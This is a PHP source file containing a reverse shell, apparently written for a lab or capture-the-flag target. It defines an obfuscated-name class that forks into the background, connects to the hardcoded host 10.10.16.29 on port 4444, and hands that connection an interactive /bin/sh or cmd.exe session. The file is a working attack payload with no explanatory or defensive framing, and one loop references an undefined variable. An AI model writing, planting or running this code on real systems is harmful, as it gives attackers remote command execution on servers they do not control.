<?php class Sh
{
    private $a = null;
    private $p = null;
    private $os = null;
    private $sh = null;
    private $ds = array(
        0 => array(
            'pipe',
            'r'
        ) ,
        1 => array(
            'pipe',
            'w'
        ) ,
        2 => array(
            'pipe',
            'w'
        )
    );
    private $o = array();
    private $b = 1024;
    private $c = 0;
    private $e = false;
    public function __construct($a, $p)
    {
        $this->a = $a;
        $this->p = $p;
        if (stripos(PHP_OS, 'LINUX') !== false)
        {
            $this->os = 'LINUX';
            $this->sh = '/bin/sh';
        }
        else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false)
        {
            $this->os = 'WINDOWS';
            $this->sh = 'cmd.exe';
            $this->o['bypass_shell'] = true;
        }
        else
        {
            $this->e = true;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
    }
    private function dem()
    {
        $e = false;
        @error_reporting(0);
        @set_time_limit(0);
        if (!function_exists('pcntl_fork'))
        {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        }
        else if (($p = @pcntl_fork()) < 0)
        {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        }
        else if ($p > 0)
        {
            $e = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        }
        else if (posix_setsid() < 0)
        {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        }
        else
        {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        @umask(0);
        return $e;
    }
    private function d($d)
    {
        $d = str_replace('<', '<', $d);
        $d = str_replace('>', '>', $d);
        echo $d;
    }
    private function r($s, $n, $b)
    {
        if (($d = @fread($s, $b)) === false)
        {
            $this->e = true;
            echo "STRM_ERROR: Cannot read from ${n}, script will now exit...\n";
        }
        return $d;
    }
    private function w($s, $n, $d)
    {
        if (($by = @fwrite($s, $d)) === false)
        {
            $this->e = true;
            echo "STRM_ERROR: Cannot write to ${n}, script will now exit...\n";
        }
        return $by;
    }
    private function rw($i, $o, $in, $on)
    {
        while (($d = $this->r($i, $in, $this->b)) && $this->w($o, $on, $d))
        {
            if ($this->os === 'WINDOWS' && $on === 'STDIN')
            {
                $this->c += strlen($d);
            }
            $this->d($d);
        }
    }
    private function brw($i, $o, $in, $on)
    {
        $s = fstat($i) ['size'];
        if ($this->os === 'WINDOWS' && $in === 'STDOUT' && $this->c)
        {
            while ($this->c > 0 && ($by = $this->c >= $this->b ? $this->b : $this->c) && $this->r($i, $in, $by))
            {
                $this->c -= $by;
                $s -= $by;
            }
        }
        while ($s > 0 && ($by = $s >= $this->b ? $this->b : $s) && ($d = $this->r($i, $in, $by)) && $this->w($o, $on, $d))
        {
            $s -= $by;
            $this->d($d);
        }
    }
    public function rn()
    {
        if (!$this->e && !$this->dem())
        {
            $soc = @fsockopen($this->a, $this->p, $en, $es, 30);
            if (!$soc)
            {
                echo "SOC_ERROR: {$en}: {$es}\n";
            }
            else
            {
                stream_set_blocking($soc, false);
                $proc = @proc_open($this->sh, $this->ds, $pps, '/', null, $this->o);
                if (!$proc)
                {
                    echo "PROC_ERROR: Cannot start the shell\n";
                }
                else
                {
                    foreach ($ps as $pp)
                    {
                        stream_set_blocking($pp, false);
                    }
                    @fwrite($soc, "SOCKET: Shell has connected! PID: " . proc_get_status($proc) ['pid'] . "\n");
                    do
                    {
                        if (feof($soc))
                        {
                            echo "SOC_ERROR: Shell connection has been terminated\n";
                            break;
                        }
                        else if (feof($pps[1]) || !proc_get_status($proc) ['running'])
                        {
                            echo "PROC_ERROR: Shell process has been terminated\n";
                            break;
                        }
                        $s = array(
                            'read' => array(
                                $soc,
                                $pps[1],
                                $pps[2]
                            ) ,
                            'write' => null,
                            'except' => null
                        );
                        $ncs = @stream_select($s['read'], $s['write'], $s['except'], null);
                        if ($ncs === false)
                        {
                            echo "STRM_ERROR: stream_select() failed\n";
                            break;
                        }
                        else if ($ncs > 0)
                        {
                            if ($this->os === 'LINUX')
                            {
                                if (in_array($soc, $s['read']))
                                {
                                    $this->rw($soc, $pps[0], 'SOCKET', 'STDIN');
                                }
                                if (in_array($pps[2], $s['read']))
                                {
                                    $this->rw($pps[2], $soc, 'STDERR', 'SOCKET');
                                }
                                if (in_array($pps[1], $s['read']))
                                {
                                    $this->rw($pps[1], $soc, 'STDOUT', 'SOCKET');
                                }
                            }
                            else if ($this->os === 'WINDOWS')
                            {
                                if (in_array($soc, $s['read']))
                                {
                                    $this->rw($soc, $pps[0], 'SOCKET', 'STDIN');
                                }
                                if (fstat($pps[2]) ['size'])
                                {
                                    $this->brw($pps[2], $soc, 'STDERR', 'SOCKET');
                                }
                                if (fstat($pps[1]) ['size'])
                                {
                                    $this->brw($pps[1], $soc, 'STDOUT', 'SOCKET');
                                }
                            }
                        }
                    }
                    while (!$this->e);
                    foreach ($pps as $pp)
                    {
                        fclose($pp);
                    }
                    proc_close($proc);
                }
                fclose($soc);
            }
        }
    }
}
echo '<pre>';
$sh = new Sh('10.10.16.29', 4444);
$sh->rn();
echo '</pre>';
unset($sh); /*@gc_collect_cycles();*/ ?>